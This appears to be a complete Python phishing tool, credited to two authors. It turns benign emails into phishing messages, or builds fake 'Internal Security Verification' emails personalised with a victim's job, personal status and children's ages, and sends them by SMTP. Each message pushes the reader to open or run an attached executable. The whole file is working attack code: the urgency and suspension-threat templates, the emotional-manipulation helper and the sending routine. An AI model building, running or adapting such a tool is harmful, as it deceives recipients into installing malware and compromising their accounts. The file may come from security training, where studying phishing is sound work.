# Raz Cohen, Aliza Lazar
import os # For system commands and environment variables
import re # For regular expression matching
import smtplib # For sending emails via SMTP
import html # For escaping HTML content
import requests # For fetching remote content (e.g., benign email templates)

from email.mime.multipart import MIMEMultipart # For creating multipart email messages
from email.mime.text import MIMEText # For creating text parts of the email
from email.mime.application import MIMEApplication # For attaching files to the email

# Function to Load Email Content
def load_benign_email(source):
    """
    Loads a benign email template from a local file, a URL, or uses a string directly.
    Used as the base to inject phishing content.
    """
    if os.path.isfile(source):
        # If source is a file path, open and read the file
        with open(source, 'r', encoding='utf-8') as f:
            return f.read()
    elif source.startswith("http://") or source.startswith("https://"):
        # If it's a URL, perform HTTP GET and return content
        response = requests.get(source)
        return response.text
    else:
        # Otherwise, treat the string as raw email text
        return source

#Function to Inject Phishing Content
def rewrite_benign_to_phishing_html(benign_text, mail_service, victim_name="User"):
    """
    Rewrites a benign email with phishing modifications:
    - Replaces names with victim name
    - Appends a note urging user to open an attachment
    """
    lines = benign_text.splitlines() # Split the email content line by line for easier processing

    new_lines = [] # List to hold modified lines

    # Regex to identify greetings and replace with 'Hi X' (where X is the victim's name)
    greeting_pattern = re.compile(r'(?i)\b(Dear|Hi|Hello|Hey)\s+([A-Za-z]+)([,\s<]*)')

    # Regex to identify inline names and replace them (such as "Alice -" or "Alice: ")
    name_inline_pattern = re.compile(r'\b([A-Z][a-z]+)\s+[-–:]')

    # Process each line and replace name mentions
    for line in lines:
        line = greeting_pattern.sub(rf'\1 {victim_name}\3', line) # Replace greeting with victim's name
        line = name_inline_pattern.sub(rf'{victim_name} -', line) # Replace name inline
        safe_line = html.escape(line, quote=True) # Escape for safe HTML rendering
        new_lines.append(safe_line)

    # Combine all lines into a single HTML string with line breaks
    html_content = "<br>\n".join(new_lines)

    # Return a full HTML email with embedded alert encouraging the user to open the attachment
    return f"""
    <html>
    <body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; color: #333; padding: 20px;">
        <div style="background-color: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); max-width: 600px; margin: auto;">
            {html_content}
            <br><br>
            <div style="font-size: 14px; color: #d8000c; background-color: #ffdddd; padding: 12px; border-radius: 5px; margin-top: 10px;">
                This email may not display all information correctly. Please open the attached file for the full content via your <u>{mail_service}</u> access.
            </div>
        </div>
    </body>
    </html>
    """

# Function to Create a Custom Phishing Email
def generate_phishing_email(username, mail_service, title, job_title, status, kids):
    """
    Builds a phishing HTML email from scratch with user-specific details.
    Includes a warning and emotional persuasion based on family context.
    """
    def format_kids_message(kids):
        """
        Formats a sentence like: 'especially with a young child aged 5'
        or: 'especially with children aged between 5 and 12'
        based on the provided ages in a comma-separated string.
        """
        if not kids:
            # If no kids provided, return an empty string
            return ""

        # Otherwise, split ages by comma, strip whitespace, and convert to integers
        ages = [int(age.strip()) for age in kids.split(",") if age.strip().isdigit()]

        if not ages:
            # If no valid ages were provided, return an empty string
            return ""

        if len(ages) == 1:
            # If only one age is provided, format it as a single child
            return f"especially with a young child aged {ages[0]}"

        # If multiple ages are provided, format it as a range
        return f"especially with children aged between {min(ages)} and {max(ages)}"

    # Generate note based on kids' ages
    kids_note = format_kids_message(kids)

    # Construct a formatted HTML phishing email
    email_html = f"""
    <html>
    <head>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background-color: #f9f9f9;
                color: #333;
                padding: 20px;
            }}
            .email-container {{
                background-color: #ffffff;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                max-width: 600px;
                margin: auto;
            }}
            .header {{
                background-color: #0073e6;
                padding: 10px;
                text-align: center;
                color: white;
                font-size: 18px;
                font-weight: bold;
                border-radius: 6px 6px 0 0;
            }}
            .notice {{
                font-size: 14px;
                color: #d8000c;
                background-color: #ffdddd;
                padding: 10px;
                border-radius: 5px;
                margin-top: 10px;
            }}
            .footer {{
                font-size: 12px;
                color: #888;
                margin-top: 30px;
                text-align: center;
            }}
        </style>
    </head>
    <body>
        <div class="email-container">
            <div class="header">
                Internal Security Verification Required
            </div><br>

            <p>Dear {title} {username},</p>

            <p>As a trusted {job_title} in our organization, and considering your {status} status{(" - " + kids_note) if kids_note else ""}, we kindly ask you to complete an one-time security verification.</p>

            <p>Our internal monitoring systems have flagged inconsistencies in your last credentials sync. To avoid disruptions to your {mail_service} services, please run the attached verification tool before Friday.</p>

            <div class="notice">
                Failure to complete this step in time may lead to temporary access suspension.
            </div>

            <p>If you experience any issues, please contact the internal IT security team immediately.</p>

            <div class="footer">
                © 2025 SecureMail Information Security Division · Internal Notification<br>
                Please do not reply to this email.
            </div>
        </div>
    </body>
    </html>
    """

    return email_html

# Function to Send Email
def send_email(from_email, to_email, subject, body_text, use_local=True, smtp_info=None):
    """
    Sends the phishing email using either local (Postfix) or remote SMTP server.
    Attaches a file named 'attachment' if present.
    """
    # Create outer message container (multipart/mixed: allows attachments)
    msg = MIMEMultipart("mixed") # Create a multipart message to hold both text and attachments
    msg["Subject"] = subject # Set the email subject
    msg["From"] = from_email # Set the sender's email address
    msg["To"] = to_email # Set the recipient's email address

    # Add HTML version of the email body
    alternative_part = MIMEMultipart("alternative") # Create a part for alternative content (text and HTML)
    html_part = MIMEText(body_text, "html") # Create the HTML part of the email
    alternative_part.attach(html_part) # Attach the HTML part to the alternative part
    msg.attach(alternative_part) # Attach the alternative part to the main message

    # Attach executable file
    attachment_path = "attachment" # Path to the attachment file (should be created by the attacker)

    # Check if the attachment file exists
    if os.path.exists(attachment_path):
        with open(attachment_path, "rb") as f:
            attached = MIMEApplication(f.read(), _subtype="octet-stream") # Read the file as binary
            attached.add_header("Content-Disposition", "attachment", filename=os.path.basename(attachment_path))
            msg.attach(attached) # Attach the file to the email

        print(f"[*] Attached file: {attachment_path}") # Log the attachment

    # If the attachment file does not exist, log a warning
    else:
        print("[!] Attachment file not found - skipping.")

    # Send via local SMTP (Postfix) or remote SMTP server
    try:
        # If using local Postfix, connect to localhost
        if use_local:
            with smtplib.SMTP("localhost", 25) as server:
                server.sendmail(from_email, [to_email], msg.as_string())

        # If using a remote SMTP server, connect using provided credentials
        else:
            with smtplib.SMTP(smtp_info["host"], smtp_info["port"]) as server:
                server.starttls() # Upgrade connection to secure TLS
                server.login(smtp_info["user"], smtp_info["pass"]) # Login to the SMTP server
                server.sendmail(from_email, [to_email], msg.as_string()) # Send the email

        print(f"\nEmail sent successfully to {to_email}") # Log successful sending

    # Handle any exceptions that occur during sending
    except Exception as e:
        print(f"\nFailed to send email: {e}")

if __name__ == "__main__":
    print("--- Email Phishing Tool ---")

    # Prompt for input source (string/file/URL)
    benign_input = input("Enter benign email (string, .txt path, URL, or leave empty to generate manually): ").strip()

    # If a benign email is provided
    if benign_input:
        # Load the benign email content
        benign_text = load_benign_email(benign_input)

        # Ask for victim's name and mail service
        username = input("Victim's name: ")
        mail_service = input("Mail service (e.g., Gmail): ")

        # Rewrite the benign email to phishing format
        phishing_body = rewrite_benign_to_phishing_html(benign_text, mail_service, victim_name=username)

    # Or manually build a full phishing email
    else:
        # Gather details for a custom phishing email
        username = input("Victim's name: ")
        mail_service = input("Mail service (e.g., Gmail): ")
        title = input("Title (Mr./Ms./Dr.): ")
        job_title = input("Job title: ")
        status = input("Personal status: ").lower()
        has_kids = input("Has kids? (y/N): ").lower()
        kids_ages = input("Enter kids' ages (comma-separated): ") if has_kids in ("y", "yes") else ""
        phishing_body = generate_phishing_email(username, mail_service, title, job_title, status, kids_ages)

    # Show a preview to the attacker
    print("\n--- Phishing Email Preview ---\n")
    print(phishing_body) # Display the generated phishing email body

    # Ask if the attacker wants to send the email
    send_now = input("\nSend this email? (y/N): ").lower()

    # If yes, gather email details and send
    if send_now in ("y", "yes"):
        # Get sender and recipient email addresses
        from_email = input("From (e.g., joseph@company.com): ")
        to_email = input("To [default: victim@victim.local]: ") or "victim@victim.local"

        # Ask for SMTP sending method
        mode = input("Use local Postfix? (Y/n): ").lower()
        use_local = (mode != "no" and mode != "n") # Default to local Postfix if not specified
        smtp_info = {} # Dictionary to hold SMTP server details if not using local Postfix

        # If not using local Postfix, gather SMTP server details
        if not use_local:
            smtp_info["host"] = input("SMTP server (e.g., smtp.mail.com): ")
            smtp_info["port"] = int(input("SMTP port (e.g., 587): "))
            smtp_info["user"] = input("SMTP username: ")
            smtp_info["pass"] = input("SMTP password: ")

        # Determine email subject depending on benign input
        subject = "Important: Immediate Action Required" if benign_input else "Account Security Update"
        send_email(from_email, to_email, subject, phishing_body, use_local, smtp_info if not use_local else None)
